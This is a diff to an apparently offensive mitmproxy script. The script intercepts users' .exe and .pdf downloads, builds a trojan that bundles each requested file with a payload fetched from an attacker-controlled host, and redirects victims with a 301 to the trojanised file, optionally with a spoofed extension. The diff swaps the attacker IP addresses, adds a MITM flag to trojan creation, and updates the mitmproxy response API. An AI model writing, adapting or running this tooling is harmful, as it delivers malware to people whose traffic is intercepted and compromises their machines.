@@ -4,9 +4,9 @@ import os
 from Trojan import *
 
 
-IP = "10.20.215.11"
+IP = "192.168.188.171"
 TARGET_TEXTENSIONS = [".exe", ".pdf"]
-EVIL_FILE = "http://10.20.215.11/nv.exe"
+EVIL_FILE = "http://192.168.188.171/file.exe"
 WEB_ROOT = "/var/www/html/"
 SPOOF_EXTENSION = True
 
@@ -23,9 +23,10 @@ def request(flow):
 		
 
 		print("[+] Generating a trojan for " + flow.request.pretty_url)
-
-		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file)
-		trojan.create()
+		
+		mitm = True
+		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file, IP)
+		trojan.create(mitm)
 		trojan.compile()
 
 		if SPOOF_EXTENSION == True: 
@@ -41,4 +42,4 @@ def request(flow):
 		
 		
 		torjan_download_url = "http://" + IP + "/" + download_file_name
-		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location": torjan_download_url})
+		flow.response = mitmproxy.http.Response.make(301, "", {"Location": torjan_download_url})
